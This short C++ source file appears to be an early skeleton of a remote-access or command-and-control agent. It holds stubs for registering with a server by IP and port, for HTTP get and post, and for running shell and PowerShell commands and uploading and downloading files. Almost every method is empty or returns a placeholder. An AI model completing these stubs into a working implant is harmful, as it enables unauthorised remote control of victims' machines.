#include "Agent.h"


void Agent::Register(std::string ip, unsigned int port) {
	const int buffer_size = MAX_COMPUTERNAME_LENGTH + 1;
	char buffer[buffer_size];
	DWORD lpnSize = buffer_size;

	if (GetComputerNameA(buffer, &lpnSize) == FALSE)
		throw std::runtime_error("Something went wrong.");
	ComputerName = std::string{ buffer };

}


std::string Agent::Get(std::string path) {
	// path = path + "/" + AgentID + "/"
	return "shell testing";
}

std::string Agent::Post(std::string path, std::string data) {
	// path = path + "/" + AgentID + "/"
	return "POST func";
}
void Agent::SetArgs(std::vector<std::string> args) {
	FunctionArguments = args;
}


//re-write this bullshit, each command in own class.

void Agent::shell(std::vector<std::string> args) {
	
}

void Agent::powershell(std::vector<std::string> args) {

}

void Agent::upload(std::vector<std::string> args) {

}

void Agent::download(std::vector<std::string> args) {

}

//void Agent::ListDirectory() {}